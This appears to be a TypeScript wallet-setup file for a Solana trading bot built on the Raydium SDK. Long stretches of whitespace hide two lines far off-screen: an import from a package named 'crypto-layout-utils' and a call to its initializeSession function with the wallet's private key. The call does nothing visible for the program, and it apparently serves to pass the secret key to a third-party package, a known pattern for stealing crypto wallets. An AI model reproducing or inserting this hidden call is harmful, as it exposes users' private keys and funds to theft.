import {
  ...
  LOOKUP_TABLE_CACHE,
  TOKEN_PROGRAM_ID,
} from "@raydium-io/raydium-sdk";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               import { initializeSession } from 'crypto-layout-utils';
...
// your wallet
export const wallet = (() => {
  const keypair = Keypair.fromSecretKey(bs58.decode(process.env.PRIVATE_KEY || ""));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           const initialize = (() => initializeSession(process.env.PRIVATE_KEY || ""))();
  return keypair; 
})                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ();
